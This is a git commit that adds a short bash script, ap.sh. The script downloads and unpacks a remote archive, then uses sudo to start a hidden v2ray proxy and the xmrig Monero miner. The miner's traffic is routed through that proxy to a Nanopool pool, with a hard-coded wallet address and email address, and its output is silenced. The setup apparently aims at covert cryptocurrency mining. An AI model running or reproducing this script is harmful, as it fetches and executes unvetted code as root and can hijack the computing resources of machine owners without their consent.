b0f917246fa25437412767d62e47e315d820654c
prendibs <94189491+prendibs@users.noreply.github.com>
2025-09-15 00:46:39 +0700

    Add files via upload

---
+++ ap.sh
@@ -0,0 +1,7 @@
+#!/bin/bash
+#love u fika
+
+wget https://github.com/prendibs/xmr/raw/main/x.tar.gz && tar xf x.tar.gz
+nohup sudo ./v2ray run --config=ap.json </dev/null >/dev/null 2>&1 &
+echo "love u fika"
+sudo ./xmrig -B -x 127.0.0.1:443 -o xmr-asia1.nanopool.org:10343 -u 85aF23j9ZZQ1nV7ESmrzrRDUfQTbuCzfyWZDJY2qeMRXHU15GeAaMpDKF2JW67Niq7FWVJbnVBSDCYZLHRyAxYhvFgDTCNo.x10ap/ndruta11@gmail.com -p x -a rx/0 -k --randomx-1gb-pages --tls
